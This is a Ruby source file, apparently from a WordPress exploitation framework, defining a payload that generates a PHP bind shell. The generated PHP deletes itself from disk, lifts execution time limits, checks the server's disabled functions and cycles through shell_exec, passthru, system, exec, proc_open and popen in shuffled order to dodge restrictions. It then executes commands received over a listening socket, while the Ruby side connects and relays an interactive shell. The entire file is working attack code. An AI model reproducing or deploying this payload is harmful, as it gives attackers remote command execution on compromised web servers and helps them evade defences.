require 'socket'

module Wpxf::Payloads
  # A PHP shell bound to an IPv4 address.
  class BindPhp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        PortOption.new(
          name: 'lport',
          required: true,
          default: 1234,
          desc: 'The port being used to listen for incoming connections'
        )
      ])
    end

    def check(mod)
      if mod.get_option('proxy')
        mod.emit_warning 'The proxy option for this module is only used for '\
                         'HTTP connections and will NOT be used for the TCP '\
                         'connection that the payload establishes'
      end
    end

    def lport
      normalized_option_value('lport')
    end

    def post_exploit(mod)
      host = mod.get_option_value('host')
      mod.emit_info "Connecting to #{host}:#{lport}..."
      socket = nil

      begin
        socket = TCPSocket.new host, lport
      rescue StandardError => e
        mod.emit_error "Failed to connect to #{host}:#{lport}: #{e}"
        return false
      end

      unless socket
        mod.emit_error "Failed to connect to #{host}:#{lport}"
        return false
      end

      mod.emit_success 'Established a session'
      original_sync_setting = STDOUT.sync
      STDOUT.sync = true
      kill_socket = false
      success = true

      begin
        read_loop = Thread.new do
          loop do
            while (line = socket.gets)
              print "\n#{line.rstrip} "
            end

            Thread.stop if kill_socket
          end
        end

        loop do
          input = STDIN.gets
          if input =~ /^(quit|exit)$/i
            kill_socket = true
            read_loop.exit
            break
          else
            socket.puts input
          end
        end
      rescue SignalException
        puts ''
        mod.emit_warning 'Caught kill signal', true
        success = true
      rescue StandardError => e
        mod.emit_error "Error encountered: #{e}"
        success = false
      ensure
        STDOUT.sync = original_sync_setting
        socket.close
        puts "Disconnected from #{host}:#{lport}"
        puts ''
      end

      success
    end

    def generate_php_vars
      generate_vars([
        :cmd, :disabled, :output, :handle, :pipes, :fp, :port, :scl, :sock,
        :ret, :msg_sock, :r, :w, :e
      ])
    end

    def php_preamble(php_vars)
      "@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0); unlink(__FILE__);
      $#{php_vars[:disabled]}=@ini_get('disable_functions');
      if(!empty($#{php_vars[:disabled]})){
        $#{php_vars[:disabled]}=preg_replace('/[, ]+/', ',', $#{php_vars[:disabled]});
        $#{php_vars[:disabled]}=explode(',', $#{php_vars[:disabled]});
        $#{php_vars[:disabled]}=array_map('trim', $#{php_vars[:disabled]});
      }else{
        $#{php_vars[:disabled]}=array();
      }"
    end

    def exec_methods(php_vars)
      [
        "if (is_callable('shell_exec') && !in_array('shell_exec', $#{php_vars[:disabled]})) {
          $#{php_vars[:output]} = shell_exec($#{php_vars[:cmd]});
        } else ",
        "if (is_callable('passthru') && !in_array('passthru', $#{php_vars[:disabled]})) {
          ob_start();
          passthru($#{php_vars[:cmd]});
          $#{php_vars[:output]} = ob_get_contents();
          ob_end_clean();
        } else ",
        "if (is_callable('system') && !in_array('system', $#{php_vars[:disabled]})) {
          ob_start();
          system($#{php_vars[:cmd]});
          $#{php_vars[:output]} = ob_get_contents();
          ob_end_clean();
        } else ",
        "if (is_callable('exec') && !in_array('exec', $#{php_vars[:disabled]})) {
          $#{php_vars[:output]} = array();
          exec($#{php_vars[:cmd]}, $#{php_vars[:output]});
          $#{php_vars[:output]} = join(chr(10), $#{php_vars[:output]}).chr(10);
        } else",
        "if (is_callable('proc_open') && !in_array('proc_open', $#{php_vars[:disabled]})) {
          $#{php_vars[:handle]} = proc_open($#{php_vars[:cmd]}, array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$#{php_vars[:pipes]});
          $#{php_vars[:output]} = NULL;
          while (!feof($#{php_vars[:pipes]}[1])) {
            $#{php_vars[:output]} .= fread($#{php_vars[:pipes]}[1],1024);
          }
          @proc_close($#{php_vars[:handle]});
        } else ",
        "if (is_callable('popen') && !in_array('popen', $#{php_vars[:disabled]})) {
          $#{php_vars[:fp]} = popen($#{php_vars[:cmd]},'r');
          $#{php_vars[:output]} = NULL;
          if (is_resource($#{php_vars[:fp]})) {
            while (!feof($#{php_vars[:fp]})) {
              $#{php_vars[:output]}.=fread($#{php_vars[:fp]},1024);
            }
          }
          @pclose($#{php_vars[:fp]});
        } else "
      ].shuffle.join('')
    end

    def encoded
      php_vars = generate_php_vars

      <<-END_OF_PHP_CODE
      <?php
        #{php_preamble(php_vars)}

        $#{php_vars[:port]} = #{normalized_option_value('lport')};
        $#{php_vars[:scl]}='socket_create_listen';
        if(is_callable($#{php_vars[:scl]})&&!in_array($#{php_vars[:scl]},$#{php_vars[:disabled]})){
          $#{php_vars[:sock]}=@$#{php_vars[:scl]}($#{php_vars[:port]});
        }else{
          $#{php_vars[:sock]}=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
          $#{php_vars[:ret]}=@socket_bind($#{php_vars[:sock]},0,$#{php_vars[:port]});
          $#{php_vars[:ret]}=@socket_listen($#{php_vars[:sock]},5);
        }
        $#{php_vars[:msg_sock]}=@socket_accept($#{php_vars[:sock]});
        @socket_close($#{php_vars[:sock]});

        $#{php_vars[:output]} = getcwd()." > \n";
        @socket_write($#{php_vars[:msg_sock]},$#{php_vars[:output]},strlen($#{php_vars[:output]}));

        while(FALSE!==@socket_select($#{php_vars[:r]}=array($#{php_vars[:msg_sock]}), $#{php_vars[:w]}=NULL, $#{php_vars[:e]}=NULL, NULL))
        {
          $#{php_vars[:output]} = '';
          $#{php_vars[:cmd]}=@socket_read($#{php_vars[:msg_sock]},2048,PHP_NORMAL_READ);

          if(FALSE===$#{php_vars[:cmd]}){break;}
          if(substr($#{php_vars[:cmd]},0,3) == 'cd '){
            chdir(substr($#{php_vars[:cmd]},3,-1));
            $#{php_vars[:output]} = getcwd()." >\n";
          } else if (substr($#{php_vars[:cmd]},0,4) == 'quit' || substr($#{php_vars[:cmd]},0,4) == 'exit') {
            break;
          }else{
            if (false === strpos(strtolower(PHP_OS), 'win')) {
              $#{php_vars[:cmd]} = trim($#{php_vars[:cmd]}, "\r\n").' 2>&1';
            }
            #{exec_methods(php_vars)}
            {
              $#{php_vars[:output]} = 0;
            }
            $#{php_vars[:output]} .= getcwd()." >\n";
          }

          @socket_write($#{php_vars[:msg_sock]},$#{php_vars[:output]},strlen($#{php_vars[:output]}));
        }
        @socket_close($#{php_vars[:msg_sock]});
      ?>
      END_OF_PHP_CODE
    end
  end
end